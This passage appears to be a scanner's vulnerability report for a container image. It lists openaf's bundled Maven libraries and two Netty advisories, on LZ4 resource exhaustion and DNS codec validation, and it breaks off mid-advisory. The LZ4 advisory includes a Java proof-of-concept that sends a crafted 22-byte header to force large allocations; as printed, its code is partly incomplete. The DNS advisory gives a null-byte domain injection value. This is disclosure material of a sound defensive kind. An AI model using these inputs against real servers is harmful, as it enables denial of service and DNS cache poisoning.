-      │                 │       ├ FilePath  : openaf/openaf.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [98]  ╭ Name      : org.eclipse.jetty.websocket:jetty-websocket-jetty-client 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/org.eclipse.jetty.websocket/jetty-websocket-jett
-      │                 │       │            │       y-client@12.1.8 
-      │                 │       │            ╰ UID : db6397111aa534a 
-      │                 │       ├ Version   : 12.1.8 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/openaf.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [99]  ╭ Name      : org.eclipse.jetty.websocket:jetty-websocket-jetty-common 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/org.eclipse.jetty.websocket/jetty-websocket-jett
-      │                 │       │            │       y-common@12.1.8 
-      │                 │       │            ╰ UID : 5cca9370ca6cc71e 
-      │                 │       ├ Version   : 12.1.8 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/openaf.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [100] ╭ Name      : org.eclipse.jetty:jetty-client 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/org.eclipse.jetty/jetty-client@12.1.8 
-      │                 │       │            ╰ UID : 1f5c76d2f9443ff9 
-      │                 │       ├ Version   : 12.1.8 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/openaf.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [101] ╭ Name      : org.eclipse.jetty:jetty-http 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/org.eclipse.jetty/jetty-http@12.1.8 
-      │                 │       │            ╰ UID : 1a238b29c95bf018 
-      │                 │       ├ Version   : 12.1.8 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/openaf.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [102] ╭ Name      : org.eclipse.jetty:jetty-io 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/org.eclipse.jetty/jetty-io@12.1.8 
-      │                 │       │            ╰ UID : 30f6598d7163432d 
-      │                 │       ├ Version   : 12.1.8 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/openaf.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [103] ╭ Name      : org.eclipse.jetty:jetty-util 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/org.eclipse.jetty/jetty-util@12.1.8 
-      │                 │       │            ╰ UID : e793b260df8ee45b 
-      │                 │       ├ Version   : 12.1.8 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/openaf.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [104] ╭ Name      : org.fusesource.hawtjni:hawtjni-runtime 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/org.fusesource.hawtjni/hawtjni-runtime@1.17 
-      │                 │       │            ╰ UID : cf88955c9d0ae18b 
-      │                 │       ├ Version   : 1.17 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/openaf.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [105] ╭ Name      : org.fusesource.jansi:jansi 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/org.fusesource.jansi/jansi@1.18 
-      │                 │       │            ╰ UID : 8ad8d3ab8ae11065 
-      │                 │       ├ Version   : 1.18 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/openaf.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [106] ╭ Name      : org.fusesource.jansi:jansi-freebsd32 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/org.fusesource.jansi/jansi-freebsd32@1.8 
-      │                 │       │            ╰ UID : 87b73bc3f694180c 
-      │                 │       ├ Version   : 1.8 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/openaf.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [107] ╭ Name      : org.fusesource.jansi:jansi-freebsd64 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/org.fusesource.jansi/jansi-freebsd64@1.8 
-      │                 │       │            ╰ UID : 68d99c3788225531 
-      │                 │       ├ Version   : 1.8 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/openaf.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [108] ╭ Name      : org.fusesource.jansi:jansi-linux32 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/org.fusesource.jansi/jansi-linux32@1.8 
-      │                 │       │            ╰ UID : b748a87749ace306 
-      │                 │       ├ Version   : 1.8 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/openaf.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [109] ╭ Name      : org.fusesource.jansi:jansi-linux64 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/org.fusesource.jansi/jansi-linux64@1.8 
-      │                 │       │            ╰ UID : 26eee13eafbc9417 
-      │                 │       ├ Version   : 1.8 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/openaf.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [110] ╭ Name      : org.fusesource.jansi:jansi-native 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/org.fusesource.jansi/jansi-native@1.8 
-      │                 │       │            ╰ UID : 6fdce73a584d6707 
-      │                 │       ├ Version   : 1.8 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/openaf.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [111] ╭ Name      : org.fusesource.jansi:jansi-osx 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/org.fusesource.jansi/jansi-osx@1.8 
-      │                 │       │            ╰ UID : 907023130116e83c 
-      │                 │       ├ Version   : 1.8 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/openaf.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [112] ╭ Name      : org.fusesource.jansi:jansi-windows32 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/org.fusesource.jansi/jansi-windows32@1.8 
-      │                 │       │            ╰ UID : ab926f311d1d4210 
-      │                 │       ├ Version   : 1.8 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/openaf.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [113] ╭ Name      : org.fusesource.jansi:jansi-windows64 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/org.fusesource.jansi/jansi-windows64@1.8 
-      │                 │       │            ╰ UID : edf1cd987a2068b8 
-      │                 │       ├ Version   : 1.8 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/openaf.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [114] ╭ Name      : org.jctools:jctools-core 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/org.jctools/jctools-core@4.0.5 
-      │                 │       │            ╰ UID : 58fe95ed59ed9509 
-      │                 │       ├ Version   : 4.0.5 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/Kube/netty-common-4.2.12.Final.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [115] ╭ Name      : org.jetbrains:annotations 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/org.jetbrains/annotations@13.0 
-      │                 │       │            ╰ UID : c0161a29fedca08e 
-      │                 │       ├ Version   : 13.0 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/S3/annotations-13.0.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [116] ╭ Name      : org.jspecify:jspecify 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/org.jspecify/jspecify@1.0.0 
-      │                 │       │            ╰ UID : ed86e540bb7b216a 
-      │                 │       ├ Version   : 1.0.0 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/S3/jspecify-1.0.0.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [117] ╭ Name      : org.semver4j:semver4j 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/org.semver4j/semver4j@6.0.0 
-      │                 │       │            ╰ UID : 452bf269462d8b69 
-      │                 │       ├ Version   : 6.0.0 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/openaf.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [118] ╭ Name      : org.slf4j:slf4j-api 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/org.slf4j/slf4j-api@2.0.17 
-      │                 │       │            ╰ UID : e6e431b8b5e0302a 
-      │                 │       ├ Version   : 2.0.17 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/openaf.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [119] ╭ Name      : org.slf4j:slf4j-nop 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/org.slf4j/slf4j-nop@2.0.17 
-      │                 │       │            ╰ UID : 67713c09148cf9b 
-      │                 │       ├ Version   : 2.0.17 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/openaf.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [120] ╭ Name      : org.snakeyaml:snakeyaml-engine 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/org.snakeyaml/snakeyaml-engine@3.0.1 
-      │                 │       │            ╰ UID : 37957af2faa98731 
-      │                 │       ├ Version   : 3.0.1 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/Kube/snakeyaml-engine-3.0.1.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [121] ╭ Name      : org.snmp4j:snmp4j 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/org.snmp4j/snmp4j@3.9.7 
-      │                 │       │            ╰ UID : 2bdda8a0d94fe3fd 
-      │                 │       ├ Version   : 3.9.7 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/openaf.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [122] ╭ Name      : org.snmp4j:snmp4j-agent 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/org.snmp4j/snmp4j-agent@3.8.3 
-      │                 │       │            ╰ UID : 7d83d9c8b188faec 
-      │                 │       ├ Version   : 3.8.3 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/openaf.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [123] ╭ Name      : org.xerial.snappy:snappy-java 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/org.xerial.snappy/snappy-java@1.1.10.8 
-      │                 │       │            ╰ UID : af735d5e5d938188 
-      │                 │       ├ Version   : 1.1.10.8 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/S3/snappy-java-1.1.10.8.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ╰ [124] ╭ Name      : org.yaml:snakeyaml 
-      │                         ├ Identifier ╭ PURL: pkg:maven/org.yaml/snakeyaml@2.4 
-      │                         │            ╰ UID : 47990f5b3f8915ac 
-      │                         ├ Version   : 2.4 
-      │                         ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                         │            │         8ebe468fc57d07e 
-      │                         │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                         │                      a5292bd158a4dcf 
-      │                         ├ FilePath  : openaf/Kube/snakeyaml-2.4.jar 
-      │                         ╰ AnalyzedBy: jar 
-      ╰ Vulnerabilities ╭ [0] ╭ VulnerabilityID : CVE-2026-42583 
-                        │     ├ VendorIDs        ─ [0]: GHSA-mj4r-2hfc-f8p6 
-                        │     ├ PkgName         : io.netty:netty-codec-compression 
-                        │     ├ PkgPath         : openaf/Kube/netty-codec-compression-4.2.12.Final.jar 
-                        │     ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec-compression@4.2.12.Final 
-                        │     │                  ╰ UID : d5a032dd793fa143 
-                        │     ├ InstalledVersion: 4.2.12.Final 
-                        │     ├ FixedVersion    : 4.2.13.Final 
-                        │     ├ Status          : fixed 
-                        │     ├ Layer            ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e9
-                        │     │                  │         4edd8ebe468fc57d07e 
-                        │     │                  ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae
-                        │     │                            0961a5292bd158a4dcf 
-                        │     ├ SeveritySource  : ghsa 
-                        │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42583 
-                        │     ├ DataSource       ╭ ID  : ghsa 
-                        │     │                  ├ Name: GitHub Security Advisory Maven 
-                        │     │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ec
-                        │     │                          osystem%3Amaven 
-                        │     ├ Fingerprint     : sha256:fb9f5bb3dfe4fea3cc45c30725e8119bb9fbec87a5322eb4f87dd5
-                        │     │                   8dc7c75cf7 
-                        │     ├ Title           : Netty Lz4FrameDecoder is vulnerable to resource exhaustion  
-                        │     ├ Description     : ### Summary
-                        │     │                   Lz4FrameDecoder allocates a ByteBuf of size
-                        │     │                   `decompressedLength` (up to 32 MB per block) before LZ4 runs.
-                        │     │                    A peer only needs a 21-byte header plus `compressedLength`
-                        │     │                   payload bytes - 22 bytes if `compressedLength == 1` - to
-                        │     │                   force that allocation.
-                        │     │                   
-                        │     │                   ### Details
-                        │     │                   io.netty.handler.codec.compression.Lz4FrameDecoder#decode
-                        │     │                   Header fields are trusted for sizing. On the compressed path,
-                        │     │                    after `readableBytes >= compressedLength`, the decoder does
-                        │     │                   `ctx.alloc().buffer(decompressedLength, decompressedLength)`
-                        │     │                   then decompresses.
-                        │     │                   ### PoC
-                        │     │                   The test below demonstrates how an attacker sending 22 bytes
-                        │     │                   will force the server to allocate 32MB
-                        │     │                   ```java
-                        │     │                       @Test
-                        │     │                       void test() throws Exception {
-                        │     │                           EventLoopGroup workerGroup = new
-                        │     │                   MultiThreadIoEventLoopGroup(NioIoHandler.newFactory());
-                        │     │                           try {
-                        │     │                               AtomicReference<Throwable> serverError = new
-                        │     │                   AtomicReference<>();
-                        │     │                               CountDownLatch latch = new CountDownLatch(1);
-                        │     │                               ServerBootstrap server = new ServerBootstrap()
-                        │     │                                       .group(workerGroup)
-                        │     │                                       .channel(NioServerSocketChannel.class)
-                        │     │                                       .childHandler(new
-                        │     │                   ChannelInitializer<SocketChannel>() {
-                        │     │                                           @Override
-                        │     │                                           protected void
-                        │     │                   initChannel(SocketChannel ch) {
-                        │     │                                               ch.pipeline()
-                        │     │                                                       .addLast(new
-                        │     │                   Lz4FrameDecoder())
-                        │     │                   ChannelInboundHandlerAdapter() {
-                        │     │                                                           @Override
-                        │     │                                                           public void
-                        │     │                   exceptionCaught(ChannelHandlerContext ctx, Throwable cause)
-                        │     │                   {
-                        │     │                                                               if (cause
-                        │     │                   instanceof DecoderException) {
-                        │     │                                                                  
-                        │     │                   serverError.set(cause.getCause());
-                        │     │                                                               } else {
-                        │     │                   serverError.set(cause);
-                        │     │                                                               }
-                        │     │                                                              
-                        │     │                   latch.countDown();
-                        │     │                                                           }
-                        │     │                                                       });
-                        │     │                                           }
-                        │     │                                       });
-                        │     │                               ChannelFuture serverChannel =
-                        │     │                   server.bind(0).sync();
-                        │     │                               Bootstrap client = new Bootstrap()
-                        │     │                                       .channel(NioSocketChannel.class)
-                        │     │                                       .handler(new
-                        │     │                                           public void
-                        │     │                   channelActive(ChannelHandlerContext ctx) {
-                        │     │                                               ByteBuf buf =
-                        │     │                   ctx.alloc().buffer(22, 22);
-                        │     │                                               buf.writeLong(MAGIC_NUMBER);
-                        │     │                                              
-                        │     │                   buf.writeByte(BLOCK_TYPE_COMPRESSED | 0x0F);
-                        │     │                                               buf.writeIntLE(1);
-                        │     │                                               buf.writeIntLE(1 << 25);
-                        │     │                                               buf.writeIntLE(0);
-                        │     │                                               buf.writeByte(0);
-                        │     │                                               ctx.writeAndFlush(buf);
-                        │     │                                               ctx.fireChannelActive();
-                        │     │                               ChannelFuture clientChannel =
-                        │     │                   client.connect(serverChannel.channel().localAddress()).sync()
-                        │     │                   ;
-                        │     │                               assertTrue(latch.await(10, TimeUnit.SECONDS));
-                        │     │                               assertInstanceOf(IndexOutOfBoundsException.class,
-                        │     │                    serverError.get());
-                        │     │                               clientChannel.channel().close();
-                        │     │                               serverChannel.channel().close();
-                        │     │                           } finally {
-                        │     │                               workerGroup.shutdownGracefully();
-                        │     │                           }
-                        │     │                       }
-                        │     │                   ```
-                        │     │                   ### Impact
-                        │     │                   Untrusted senders without per-channel / aggregate limits can
-                        │     │                   stress memory with many small requests. 
-                        │     ├ Severity        : HIGH 
-                        │     ├ VendorSeverity   ─ ghsa: 3 
-                        │     ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
-                        │     │                         ╰ V3Score : 7.5 
-                        │     ╰ References       ╭ [0]: https://github.com/netty/netty 
-                        │                        ╰ [1]: https://github.com/netty/netty/security/advisories/GHSA
-                        │                               -mj4r-2hfc-f8p6 
-                        ├ [1] ╭ VulnerabilityID : CVE-2026-42579 
-                        │     ├ VendorIDs        ─ [0]: GHSA-cm33-6792-r9fm 
-                        │     ├ PkgName         : io.netty:netty-codec-dns 
-                        │     ├ PkgPath         : openaf/Kube/netty-codec-dns-4.2.12.Final.jar 
-                        │     ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec-dns@4.2.12.Final 
-                        │     │                  ╰ UID : d1018bca82fa2aba 
-                        │     ├ InstalledVersion: 4.2.12.Final 
-                        │     ├ FixedVersion    : 4.2.13.Final, 4.1.133.Final 
-                        │     ├ Status          : fixed 
-                        │     ├ Layer            ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e9
-                        │     │                  │         4edd8ebe468fc57d07e 
-                        │     │                  ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae
-                        │     │                            0961a5292bd158a4dcf 
-                        │     ├ SeveritySource  : ghsa 
-                        │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42579 
-                        │     ├ DataSource       ╭ ID  : ghsa 
-                        │     │                  ├ Name: GitHub Security Advisory Maven 
-                        │     │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ec
-                        │     │                          osystem%3Amaven 
-                        │     ├ Fingerprint     : sha256:a7af8a9bdc0094fe18e741cbcedf4f86ec31b8beb0fc87b167f608
-                        │     │                   033804980d 
-                        │     ├ Title           : Netty has a DNS Codec Input Validation Bypass (Encoder +
-                        │     │                   Decoder) 
-                        │     ├ Description     : # Security Vulnerability Report: DNS Codec Input Validation
-                        │     │                   Bypass in Netty (Encoder + Decoder)
-                        │     │                   
-                        │     │                   ## 1. Vulnerability Summary
-                        │     │                   | Field | Value |
-                        │     │                   |-------|-------|
-                        │     │                   | **Product** | Netty |
-                        │     │                   | **Version** | 4.2.12.Final (and all prior versions with
-                        │     │                   codec-dns) |
-                        │     │                   | **Component** | `io.netty.handler.codec.dns.DnsCodecUtil`
-                        │     │                   |
-                        │     │                   | **Vulnerability Type** | CWE-20: Improper Input Validation
-                        │     │                   / CWE-626: Null Byte Interaction Error / CWE-400:
-                        │     │                   Uncontrolled Resource Consumption |
-                        │     │                   | **Impact** | DNS Cache Poisoning / Domain Validation Bypass
-                        │     │                    / Denial of Service / Malformed DNS Packets |
-                        │     │                   ## 2. Affected Components
-                        │     │                   Both the encoder and decoder in the same file are affected:
-                        │     │                   - `io.netty.handler.codec.dns.DnsCodecUtil` —
-                        │     │                   `encodeDomainName()` method (lines 31-51):
-                        │     │                     - No null byte validation in domain name labels
-                        │     │                     - No per-label length validation (RFC 1035 max: 63 bytes)
-                        │     │                     - No total domain name length validation (RFC 1035 max: 255
-                        │     │                    bytes)
-                        │     │                     - Empty labels silently truncate the domain name
-                        │     │                   `decodeDomainName()` method (lines 53-118):
-                        │     │                     - No per-label length validation (max 63)
-                        │     │                     - No total domain name length validation (max 255)
-                        │     │                     - Unbounded StringBuilder growth from attacker-controlled
-                        │     │                   DNS responses
-                        │     │                   ## 3. Vulnerability Description
-                        │     │                   Netty's DNS codec does **not enforce RFC 1035 domain name
-                        │     │                   constraints** during either encoding or decoding. This
-                        │     │                   creates a bidirectional attack surface: malicious DNS
-                        │     │                   responses can exploit the decoder, and user-influenced
-                        │     │                   hostnames can exploit the encoder.
-                        │     │                   ### 3.1 Encoder Side — Null Byte Injection (CWE-626)
-                        │     │                   A domain name containing a null byte (e.g.,
-                        │     │                   `"evil\0.example.com"`) is encoded with the null byte
-                        │     │                   embedded in the label data. This creates a domain name that
-                        │     │                   different DNS implementations interpret differently:
-                        │     │                   - **Java (full string)**: sees `"evil\0.example.com"` as a
-                        │     │                   single label containing a null
-                        │     │                   - **C/native DNS libraries**: truncate at the null byte,
-                        │     │                   seeing only `"evil"`
-                        │     │                   - **DNS servers**: may accept or reject based on
-                        │     │                   implementation
-                        │     │                   This differential interpretation enables **DNS cache
-                        │     │                   poisoning** and **domain validation bypass**.
-                        │     │                   ### 3.2 Encoder Side — Overlength Label (RFC 1035 Violation)
-                        │     │                   Labels exceeding 63 bytes are accepted by the encoder. The
-                        │     │                   length byte is written as a single unsigned byte, so a
-                        │     │                   200-byte label writes `0xC8` (200) as the length. Per RFC
-                        │     │                   1035, values 192-255 indicate **compression pointers**. This
-                        │     │                   means:
-                        │     │                   - A 200-byte label length `0xC8` would be interpreted as a
-                        │     │                   **compression pointer** by standards-compliant DNS parsers
-                        │     │                   - This creates **parser confusion** between label and pointer
-                        │     │                    interpretation
-                        │     │                   ### 3.3 Encoder Side — Silent Truncation via Empty Labels
-                        │     │                   ```java
-                        │     │                   encodeDomainName("a..b.com", buf);
-                        │     │                   // Encodes as: [01] 'a' [00]
-                        │     │                   // Only "a." is encoded, ".b.com" is silently dropped!
